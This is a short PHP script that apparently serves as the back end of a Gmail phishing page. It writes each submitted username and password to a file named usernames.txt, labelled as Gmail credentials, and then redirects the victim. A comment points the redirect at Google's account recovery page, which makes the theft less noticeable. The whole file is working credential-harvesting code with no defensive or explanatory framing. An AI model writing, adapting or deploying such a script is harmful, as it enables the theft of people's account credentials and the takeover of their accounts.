<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://accounts.google.com/signin/v2/recoveryidentifier
header("Location: $url");
exit();
?>